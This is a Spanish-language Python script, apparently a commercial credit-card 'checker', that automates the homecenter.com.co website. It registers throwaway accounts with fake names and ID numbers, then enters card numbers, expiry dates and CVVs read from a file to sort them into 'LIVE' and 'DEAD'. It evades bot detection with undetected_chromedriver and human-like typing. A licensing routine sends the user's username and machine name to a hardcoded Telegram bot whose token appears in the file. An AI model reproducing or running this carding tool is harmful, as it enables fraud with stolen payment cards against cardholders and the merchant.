# ========== MÓDULOS DE LA BIBLIOTECA ESTÁNDAR ==========
import base64
import getpass
import hashlib
import os
import random
import re
import socket
import string
import subprocess
import sys
import threading
import time
import traceback
import uuid
from datetime import datetime

# ========== MÓDULOS DE TERCEROS ==========
import requests
from colorama import Fore, Style, init
from faker import Faker
from selenium import webdriver
from selenium.common.exceptions import (
    ElementClickInterceptedException,
    NoSuchElementException,
    NoSuchWindowException,
    StaleElementReferenceException,
    TimeoutException,
    WebDriverException
)
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc

# ========== CONFIGURACIÓN COLOR ==========
init(autoreset=True)

# =========== CONFIGURACIÓN DE PATHS UNIVERSALES ===========
if getattr(sys, 'frozen', False):  # Si está en EXE compilado
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LICENSE_FILE = os.path.join(BASE_DIR, "license.key")
LOCK_FILE = os.path.join(BASE_DIR, "primeravez.lock")
NEEDED_FILES = ["tarjetas.txt", "homcorreo.txt", "lives.txt"]

# =========== VERIFICAR/INSTALAR DEPENDENCIAS =============
REQUIREMENTS = ["requests", "faker", "selenium", "undetected-chromedriver", "colorama"]
if not getattr(sys, 'frozen', False):  # Solo si es .py, no en .exe
    import importlib
    import subprocess
    for pkg in REQUIREMENTS:
        try:
            importlib.import_module(pkg.replace("-", "_"))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

# =========== CREAR ARCHIVOS NECESARIOS SI NO EXISTEN ===========
for fname in NEEDED_FILES:
    path = os.path.join(BASE_DIR, fname)
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            pass

# =========== FUNCIONES DE SEGURIDAD Y LICENCIA ===========

token= "6465277744:AAGkwd2b-R-YPz5OdzHDC_ne1GLVgLdOAPU"
chat_id = "-1002709977224"
XOR_KEY = "JeroniMocKs"
file_path = os.path.join(BASE_DIR, "tarjetas.txt")
def xor(data, key=XOR_KEY):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def get_unique_pc_key():
    base = getpass.getuser() + socket.gethostname() + str(uuid.getnode())
    return hashlib.sha256(base.encode()).hexdigest().upper()[:16]

def enviar_a_telegram(clave):
    from datetime import datetime
    username = getpass.getuser()
    pcname = socket.gethostname()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mensaje = (
        f"🛡️ Nueva petición de licencia:\n"
        f"Clave única: {clave}\n"
        f"Usuario: {username}\n"
        f"PC: {pcname}\n"
        f"Fecha: {now}"
    )
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": mensaje})
    except Exception:
        pass

PC_KEY = get_unique_pc_key()

def base64_decode(s):
    return base64.b64decode(s.encode()).decode()

def validar_licencia_interactiva(lic_encoded):
    from datetime import datetime
    try:
        lic_decoded = base64_decode(lic_encoded)
        lic_xor = xor(lic_decoded)
        lic_data = lic_xor.strip().split("|")
        if len(lic_data) != 2:
            return False, "❌ Formato de licencia inválido."
        codigo_licencia, fecha_exp = lic_data
        lic_raw = f"{PC_KEY}|{fecha_exp}"
        expected_code = hashlib.sha256(lic_raw.encode()).hexdigest().upper()
        if codigo_licencia != expected_code:
            return False, "❌ Licencia incorrecta para este PC o ya expiró."
        if fecha_exp.strip().upper() == "ILIMITADO":
            return True, None
        hoy = datetime.now().date()
        try:
            fecha_exp_dt = datetime.strptime(fecha_exp, "%Y-%m-%d").date()
        except:
            return False, "❌ Formato de fecha de expiración inválido."
        if hoy > fecha_exp_dt:
            return False, f"❌ Licencia expirada (fecha: {fecha_exp_dt})."
        return True, None
    except Exception:
        return False, "❌ Licencia ilegible o dañada."

def print_inline(msg, ancho=80, duracion=None, paso=0.3):
    puntos = ['', '.', '..', '...', '....', '.....']
    if duracion is None:
        print('\r' + str(msg).ljust(ancho), end='', flush=True)
        return
    t_final = time.time() + duracion
    i = 0
    while time.time() < t_final:
        loading = msg + puntos[i % len(puntos)]
        print('\r' + str(loading).ljust(ancho), end='', flush=True)
        time.sleep(paso)
        i += 1
    print('\r' + ' ' * ancho, end='\r', flush=True)

if not os.path.exists(LOCK_FILE) and not os.path.exists(LICENSE_FILE):
    enviar_a_telegram(PC_KEY)
    with open(LOCK_FILE, "w") as f:
        f.write("shown")
    print("\n📝 Solicitud de licencia enviada al desarrollador.")
    print("Contacta al desarrollador por WhatsApp: 3028642185 para activar tu software.")
    print("Cuando la recibas, pégala a continuación para activar el programa.\n")
    while True:
        license_txt = input("Pega la licencia aquí y presiona ENTER:\n> ").strip()
        ok, error = validar_licencia_interactiva(license_txt)
        if ok:
            with open(LICENSE_FILE, "w") as licf:
                licf.write(license_txt)
            print("✅ Licencia activada correctamente. Por favor, reinicia el programa.")
            input("Presiona ENTER para salir.")
            sys.exit(0)
        else:
            print(error)
            print("Intenta de nuevo. Si el error persiste, contacta al desarrollador.")

elif not os.path.exists(LOCK_FILE) or not os.path.exists(LICENSE_FILE):
    print("\n❌ PROTECCIÓN ANTIPIRATERÍA ACTIVADA")
    print("Este programa ya NO puede ser activado en este PC.")
    print("Contacta al desarrollador si necesitas soporte.")
    print("WhatsApp: 3028642185")
    input("Presiona Enter para salir...")
    sys.exit(0)
else:
    print_inline("🔑 Leyendo licencia...", 80, 1.5)

def validar_licencia():
    from datetime import datetime
    with open(LICENSE_FILE, "r") as lic:
        lic_encoded = lic.read().strip()
    lic_decoded = base64_decode(lic_encoded)
    lic_xor = xor(lic_decoded)
    lic_data = lic_xor.strip().split("|")
    if len(lic_data) != 2:
        print("❌ Licencia corrupta o malformada.")
        input("Presiona Enter para salir...")
        sys.exit(0)
    codigo_licencia, fecha_exp = lic_data
    lic_raw = f"{PC_KEY}|{fecha_exp}"
    expected_code = hashlib.sha256(lic_raw.encode()).hexdigest().upper()
    if codigo_licencia != expected_code:
        print("\n❌ La licencia no es válida para este PC o ya expiró.")
        input("Presiona Enter para salir...")
        sys.exit(0)
    if fecha_exp.strip().upper() == "ILIMITADO":
        print("🔹 Licencia: Ilimitada 💎")
        return
    hoy = datetime.now().date()
    try:
        fecha_exp_dt = datetime.strptime(fecha_exp, "%Y-%m-%d").date()
    except:
        print("❌ Formato de fecha de licencia inválido.")
        input("Presiona Enter para salir...")
        sys.exit(0)
    if hoy > fecha_exp_dt:
        print("\n❌ Licencia expirada.")
        print(f"Fecha de expiración: {fecha_exp_dt}")
        input("Presiona Enter para salir...")
        sys.exit(0)
    print(f"🔹 Licencia válida hasta: {fecha_exp_dt}")

validar_licencia()


def print_error(msg):
    print(Fore.RED + "⚠️ " + msg + Style.RESET_ALL)

def print_success(msg):
    print(Fore.GREEN + "✅ " + msg + Style.RESET_ALL)

def print_warning(msg):
    print(Fore.YELLOW + "🟡 " + msg + Style.RESET_ALL)

def print_info(msg):
    print(Fore.CYAN + "🔵 " + msg + Style.RESET_ALL)

def print_reload(msg):
    print(Fore.MAGENTA + "🔄 " + msg + Style.RESET_ALL)



def create_driver():
    options = uc.ChromeOptions()
    options.add_argument("--disable-features=ChromeBrowserCloudManagement")
    options.add_argument("--disable-dev-shm-usage")
    #options.add_argument("--incognito")  # Modo incógnito
    options.add_argument("--disable-extensions")  # Deshabilitar extensiones
    options.add_argument("--no-sandbox")  # Evitar problemas con el sandbox
    options.add_argument("--disable-notifications")  # Deshabilitar notificaciones
    options.add_argument("--disable-popup-blocking")  # Deshabilitar bloqueador de popups
    options.add_argument("--disable-plugins-discovery")  # Deshabilitar la detección de plugins
    options.add_argument("--disable-plugins")  # Deshabilitar plugins
    options.add_argument("--disable-cache")  # Deshabilitar caché
    options.add_argument("--disable-dev-shm-usage")  # Para evitar problemas de memoria compartida
    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)

    # Inicia el driver con las opciones configuradas
    driver = uc.Chrome(options=options)
    
    return driver


token = "6465277744:AAGkwd2b-R-YPz5OdzHDC_ne1GLVgLdOAPU"
chat_id = "-4252866702"
file_path= r'C:\Users\Thide\Desktop\CHECKER\tarjetas.txt'



def cerrar_modal_encuesta_si_aparece(driver, timeout=3, debug=False):
    js_kill = """
        let modals = Array.from(document.querySelectorAll(
            '[class*="ins-preview-wrapper"], [class*="ins-element-wrap"], [class*="ins-element-overlay"], #ins-frameless-overlay'
        ));
        modals.forEach(m => {
            m.style.display = "none";
            m.style.visibility = "hidden";
            if (m.parentNode) m.parentNode.removeChild(m);
        });
    """
    try:
        driver.switch_to.default_content()
        driver.execute_script(js_kill)
        # Si debug está activo, podrías agregar logging aquí, pero no es obligatorio
        return True
    except Exception:
        return False



def click_elemento(driver):
    """Función que verifica y da clic a un botón específico."""
    try:
        # Esperar hasta que el contenedor principal esté presente
        contenedor_xpath = '/html/body/div[1]/div/div/div/div/main/main/aside/div[1]'
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, contenedor_xpath))
        )

        # Esperar hasta que el botón objetivo esté presente
        boton_xpath = '/html/body/div[1]/div/div/div/div/main/main/aside/div[1]/div[2]/div/div[3]/button/span'
        boton = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, boton_xpath))
        )

        # Dar clic al botón
        boton.click()
        
    except TimeoutException:
        print("El elemento no se encontró dentro del tiempo de espera.")
    except NoSuchElementException:
        print("El elemento no está presente en la página.")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")



def send_telegram_message(token, chat_id, message, parse_mode=None):
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={requests.utils.quote(message)}"
    if parse_mode:
        url += f"&parse_mode={parse_mode}"
    requests.get(url)

def remove_card_from_file(card_number, expiry_month, expiry_year, cvv):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != f"{card_number}|{expiry_month}|{expiry_year}|{cvv}":
                file.write(line)


def contar_tarjetas(file_path):
    try:
        with open(file_path, 'r') as file:
            tarjetas = file.readlines()
        return len(tarjetas)
    except FileNotFoundError:
        print("El archivo de tarjetas no se encuentra.")
        return 0

def scroll_and_click(driver, by, value):
    element = WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((by, value))
    )
    driver.execute_script("arguments[0].scrollIntoView(true);", element)
    ActionChains(driver).move_to_element(element).click().perform()

# Función para leer el archivo de seguimiento y cargar el uso de cada correo
def cargar_uso_correos():
    uso_correos = {}
    try:
        with open('usocorreos.txt', 'r') as file:
            for linea in file:
                correo, contador = linea.strip().split(':')
                uso_correos[correo] = int(contador)
    except FileNotFoundError:
        pass  # Si no existe, no hay problema; se creará más tarde
    return uso_correos

# Función para guardar el estado del archivo de uso de correos
def guardar_uso_correos(uso_correos):
    with open('usocorreos.txt', 'w') as file:
        for correo, contador in uso_correos.items():
            file.write(f"{correo}:{contador}\n")

# Función para obtener una línea aleatoria del archivo 'homcorreo.txt'
def obtener_datos_aleatorios():
    try:
        with open('homcorreo.txt', 'r') as file:
            lineas = file.readlines()
            if not lineas:
                raise ValueError("El archivo 'homcorreo.txt' está vacío")
            # Elegir una línea aleatoria
            linea_aleatoria = random.choice(lineas).strip()
            
            if ':' not in linea_aleatoria:
                raise ValueError(f"La línea seleccionada no tiene el formato esperado (correo:contraseña): {linea_aleatoria}")
            
            return linea_aleatoria
    except FileNotFoundError:
        print("El archivo 'homcorreo.txt' no se encuentra.")
        raise
    except ValueError as ve:
        print(ve)
        raise

# Función para eliminar un correo fallido del archivo
def eliminar_correo_fallido(correo_fallido):
    with open('homcorreo.txt', 'r') as file:
        lineas = file.readlines()

    # Mantener solo las líneas que no corresponden al correo fallido
    with open('homcorreo.txt', 'w') as file:
        for linea in lineas:
            if correo_fallido not in linea:
                file.write(linea)

# Generar datos aleatorios
def generar_datos():
    fake = Faker('es_ES')
    
    # Generar nombre y apellidos
    nombre = fake.first_name()
    apellidos = fake.last_name()
    
    # Generar correo electrónico
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=13)) + "@homecenter.com.co"
    
    # Generar contraseña
    password = generar_contraseña()
    
    # Generar número de celular colombiano
    celular = "3" + random.choice(["10", "12", "20"]) + ''.join(random.choices(string.digits, k=8))
    
    # Generar número de cédula
    cedula = "199" + ''.join(random.choices(string.digits, k=7))
    
    return nombre, apellidos, email, password, celular, cedula

# Generar una contraseña válida
def generar_contraseña():

    password = ''.join(random.choices(string.ascii_lowercase, k=5)) + \
               ''.join(random.choices(string.ascii_uppercase, k=1)) + \
               ''.join(random.choices(string.digits, k=1)) + \
               ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=2))
    return password

# Guardar cuenta en el archivo
def guardar_cuenta(email, password):
    with open("homcorreo.txt", "a") as file:
        file.write(f"{email}:{password}\n")
        
def print_checkbox(checked):
    if checked:
        print(Fore.GREEN + "☑️ Checkbox está marcado: True" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "⬜ Checkbox NO está marcado: False" + Style.RESET_ALL)

def print_cuenta_guardada():
    print(Fore.GREEN + "💾✅ Cuenta guardada con éxito" + Style.RESET_ALL)

def guardar_live(msg, archivo="lives.txt"):
    with open(archivo, "a", encoding="utf-8") as f:
        f.write(msg + "\n")
        
def crear_cuenta(driver):
    try:
        nombre, apellidos, email, password, celular, cedula = generar_datos()
        time.sleep(1)
        cerrar_modal_encuesta_si_aparece(driver, timeout=2, debug=False)
        time.sleep(2)

        # 1. Espera formulario login
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.ID, "testId-LoginForm"))
        )

        # 2. Botón "Crear cuenta"
        boton_xpath = '/html/body/div[1]/div/header/aside/div[1]/div/div/div/div[2]/div/div/div[2]/div[2]/div[1]/button'
        try:
            boton = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, boton_xpath))
            )
            driver.execute_script("arguments[0].click();", boton)
            time.sleep(1)
        except Exception as e:
            print(f"❌ [Error] No se pudo hacer clic en el botón de registro: {e}")
            return False

        cerrar_modal_encuesta_si_aparece(driver, timeout=2, debug=False)
        time.sleep(1)

        # 3. Esperar formulario de registro
        try:
            WebDriverWait(driver, 15, poll_frequency=0.2).until(
                EC.presence_of_element_located((By.CLASS_NAME, "lite-registration-form"))
            )
        except Exception as e:
            print(f"❌ [Error] Formulario de registro no apareció: {e}")
            return False

        def escribir_lento(elemento, texto):
            for c in texto:
                elemento.send_keys(c)
                time.sleep(random.uniform(0.04, 0.08))

        # 4. Campos personales
        try:
            # Nombre
            scroll_and_click(driver, By.ID, "testId-firstName")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-firstName"))), nombre)
            time.sleep(random.uniform(0.04, 0.08))
            # Apellidos
            scroll_and_click(driver, By.ID, "testId-lastName")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-lastName"))), apellidos)
            time.sleep(random.uniform(0.04, 0.08))
            # Documento
            scroll_and_click(driver, By.ID, "testId-document")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-document"))), cedula)
        except Exception as e:
            print(f"❌ [Error] No se pudo rellenar datos personales: {e}")
            return False
        time.sleep(random.uniform(0.04, 0.08))

        # 5. Botón continuar documento
        try:
            submit_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-btn-document-verification"))
            )
            driver.execute_script("arguments[0].click();", submit_button)
            time.sleep(1)
        except Exception as e:
            print(f"❌ [Error] No se pudo hacer clic en continuar documento: {e}")
            return False
        time.sleep(random.uniform(0.04, 0.08))

        # 6. Celular
        try:
            scroll_and_click(driver, By.ID, "testId-input-phoneNumber")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-input-phoneNumber"))), celular)
        except Exception as e:
            print(f"❌ [Error] No se pudo ingresar celular: {e}")
            return False
        time.sleep(random.uniform(0.04, 0.08))

        # 7. Contribuyente
        try:
            tipo_contribuyente = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@id='testId-Dropdown-taxpayerType-value']/span"))
            )
            driver.execute_script("arguments[0].click();", tipo_contribuyente)
            tipo_item = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-li-testId-DropdownList-testId-Dropdown-taxpayerType-dropdown-list-item-1"))
            )
            driver.execute_script("arguments[0].click();", tipo_item)
        except Exception as e:
            print(f"❌ [Error] No se pudo seleccionar tipo de contribuyente: {e}")
            return False
        time.sleep(random.uniform(0.04, 0.08))

        # 8. Email y contraseña
        try:
            scroll_and_click(driver, By.ID, "testId-email")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-email"))), email)
            scroll_and_click(driver, By.ID, "testId-password")
            escribir_lento(WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-password"))), password)
        except Exception as e:
            print(f"❌ [Error] No se pudo ingresar email/contraseña: {e}")
            return False
        time.sleep(random.uniform(0.04, 0.08))

        # 9. Checkbox de Términos (click en el span)
        try:
            checkbox_span = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "checkbox-testId-acceptTermsAndConditions"))
            )
            driver.execute_script("arguments[0].click();", checkbox_span)
        except Exception as e:
            print(f"❌ [Error] No se pudo marcar el checkbox de Términos: {e}")
            return False

        # 10. Enviar registro
        try:
            submit_reg = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "testId-btn-registration-submit"))
            )
            driver.execute_script("arguments[0].click();", submit_reg)
            time.sleep(3)
        except Exception as e:
            print(f"❌ [Error] No se pudo enviar el formulario de registro: {e}")
            return False

        # 11. Último paso extra si aplica (clic en algún elemento extra)
        try:
            click_elemento(driver)
            time.sleep(2)
        except Exception:
            pass

        guardar_cuenta(email, password)
        print("✅ Cuenta creada y guardada exitosamente.")
        return True

    except Exception as e:
        print(f"❌ [Error general en crear_cuenta]: {e}")
        return False



def safe_click(driver, element, desc="", max_retries=5):
    """Intenta hacer clic, matando el modal si es interceptado."""
    for intento in range(1, max_retries + 1):
        try:
            element.click()
            return True
        except ElementClickInterceptedException:
            cerrar_modal_encuesta_si_aparece(driver, timeout=2, debug=True)
            time.sleep(0.8)
        except Exception as e:
            print(f"❌ Error inesperado en safe_click ({desc}): {e}")
            return False
    print(f"❌ No se pudo clicar en {desc} tras {max_retries} intentos.")
    return False


tarjetas_procesadas_global = 0

def tested_card(driver, file_path, token, chat_id, dead_seguidos):
    global tarjetas_procesadas_global
    tarjetas_procesadas_bloque = 0

    with open(file_path, 'r') as file:
        tarjetas = file.readlines()
    total_tarjetas = len(tarjetas)

    while tarjetas_procesadas_bloque < 3 and tarjetas:
        tarjeta = tarjetas.pop(0).strip()
        if not tarjeta:
            continue
        num, mes, anio, cvv = tarjeta.split('|')
        retries = 3

        while retries > 0:
            try:
                cerrar_modal_encuesta_si_aparece(driver, timeout=3, debug=False)
                time.sleep(2)

                # --- AGREGAR TARJETA ---
                btn = WebDriverWait(driver, 20).until(
                    EC.element_to_be_clickable((By.ID, "testId-landing-payment-addcard"))
                )
                driver.execute_script("arguments[0].scrollIntoView(true);", btn)
                if not safe_click(driver, btn, "Agregar tarjeta"):
                    retries -= 1
                    continue

                time.sleep(2)
                cerrar_modal_encuesta_si_aparece(driver, timeout=7, debug=False)
                time.sleep(2)

                # --- SELECCIONAR OPCIÓN TARJETA ---
                opt = WebDriverWait(driver, 15).until(
                    EC.element_to_be_clickable((By.ID, "testId-choose-creditCard"))
                )
                if not safe_click(driver, opt, "Opción tarjeta de débito"):
                    retries -= 1
                    continue

                time.sleep(1.7)
                cerrar_modal_encuesta_si_aparece(driver, timeout=3, debug=False)
                time.sleep(1)

                # --- IFRAME DOBLE SWITCH ---
                iframe = WebDriverWait(driver, 4).until(
                    EC.presence_of_element_located((By.XPATH,
                        "/html/body/div[1]/div/div/div/div/main/div/section[3]/aside/div[1]/div[2]/div/iframe"))
                )
                driver.switch_to.frame(iframe)
                time.sleep(1)
                cerrar_modal_encuesta_si_aparece(driver, timeout=4, debug=False)
                time.sleep(1)
                driver.switch_to.frame(iframe)
                time.sleep(1)

                # --- CAMPOS TARJETA ---
                WebDriverWait(driver, 4).until(EC.presence_of_element_located(
                    (By.XPATH, "/html/body/div[1]/div/div/div/form/div[2]/div/div/span/input")))
                driver.find_element(By.XPATH,
                    "/html/body/div[1]/div/div/div/form/div[2]/div/div/span/input").send_keys(num)
                Select(WebDriverWait(driver,3).until(EC.presence_of_element_located((By.ID, "expMonth")))).select_by_value(mes)
                Select(WebDriverWait(driver,3).until(EC.presence_of_element_located((By.ID, "expYear")))).select_by_value(anio[-2:])
                driver.find_element(By.XPATH,
                    "/html/body/div[1]/div/div/div/form/div[4]/div/div/span/input").send_keys(cvv)

                time.sleep(1)

                # --- CONFIRMAR ---
                confirm_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "btnConfirm"))
                )
                if not safe_click(driver, confirm_btn, "Confirmar"):
                    retries -= 1
                    continue

                # --- RESULTADO ---
                try:
                    WebDriverWait(driver, 30).until(EC.presence_of_element_located(
                        (By.CSS_SELECTOR, ".swal2-success, .swal2-error")))
                except TimeoutException:
                    break  # Sal del ciclo de retries para reiniciar navegador

                # --- EVALUAR RESPUESTA ---
                success_els = driver.find_elements(By.CSS_SELECTOR, ".swal2-success")
                error_els = driver.find_elements(By.CSS_SELECTOR, ".swal2-error")
                is_success = success_els and success_els[0].is_displayed()
                is_error = error_els and error_els[0].is_displayed()

                if is_success:

                    live_msg = f"[✅ LIVE] {num}|{mes}|{anio}|{cvv}"
                    print(Fore.GREEN + live_msg + Fore.RESET)
                    guardar_live(live_msg)
                    remove_card_from_file(num, mes, anio, cvv)
                    tarjetas_procesadas_global += 1
                    tarjetas_procesadas_bloque += 1
                    driver.quit()
                    return None, 0   # Reiniciar cuenta, reset DEADs

                elif is_error:
                    print(Fore.RED + f"[💀 DEAD] {num}|{mes}|{anio}|{cvv}" + Fore.RESET)
                    remove_card_from_file(num, mes, anio, cvv)
                    tarjetas_procesadas_global += 1
                    tarjetas_procesadas_bloque += 1
                    driver.switch_to.default_content()
                    driver.get("https://www.homecenter.com.co/homecenter-co/myaccount/")
                    dead_seguidos += 1  # <--- AUMENTA DEAD
                    if dead_seguidos >= 3:
                        driver.quit()
                        return None, 0  # Reiniciar cuenta y DEADs
                    break  # Sale del ciclo de retries y sigue con la próxima tarjeta

                else:
                    break

            except Exception:
                retries -= 1
                break

        if retries == 0:
            driver.quit()
            return None, dead_seguidos  # El main ya hace el flujo de cuenta nueva

    return driver, dead_seguidos  # Retorna el driver actual y el contador de DEADs

def main():
    import random  # Solo si quieres hacer sleeps random, puedes quitarlo si no
    tarjetas_probadas = 0
    driver = None
    TARJETAS_X_CUENTA = 2
    dead_seguidos = 0

    while True:
        if tarjetas_probadas % TARJETAS_X_CUENTA == 0 or driver is None:
            if driver is not None:
                try:
                    driver.quit()
                except Exception:
                    pass
            driver = create_driver()
            driver.get("https://www.homecenter.com.co/homecenter-co/myaccount/")
            crear_cuenta(driver)
            dead_seguidos = 0

        # Ahora tested_card devuelve dos valores
        result, dead_seguidos = tested_card(driver, file_path, token, chat_id, dead_seguidos)
        tarjetas_probadas += 1

        if result is None:
            print(Fore.CYAN + "🔁 Reiniciando navegador y cuenta..." + Fore.RESET)
            driver = None
            continue

        # time.sleep(random.uniform(1, 2))

if __name__ == "__main__":
    main()